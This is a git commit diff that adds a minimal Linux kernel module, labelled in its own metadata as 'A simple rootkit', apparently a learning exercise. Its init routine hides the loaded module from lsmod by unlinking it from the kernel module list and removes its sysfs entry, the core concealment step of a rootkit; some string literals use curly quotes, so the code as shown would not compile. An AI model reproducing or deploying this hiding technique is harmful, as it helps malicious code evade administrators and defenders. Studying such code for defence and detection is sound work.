6b573fce16a4b442921e31a7b70505431c5be0fc
Xincheng Yang <xyang76@hawk.iit.edu>
2017-03-08 10:56:15 -0600

    Update

---
+++ Rootkit/module.c
@@ -0,0 +1,28 @@
+/*lkm.c*/
+ 
+#include <linux/module.h>    
+#include <linux/kernel.h>   
+#include <linux/init.h>     
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR(“Xincheng Yang”);
+MODULE_DESCRIPTION(“A simple rootkit”);   
+ 
+static int lkm_init(void)
+{
+    //Hide this module from kernel modules(lsmod) 
+    list_del_init(&__this_module.list);
+
+    //Hide this module from /sys/modules
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+    printk(“Hello world, module loaded\n");
+    return 0;    
+}
+ 
+static void lkm_exit(void)
+{
+    printk(“Hello world, module removed\n");
+}
+ 
+module_init(lkm_init);
+module_exit(lkm_exit);
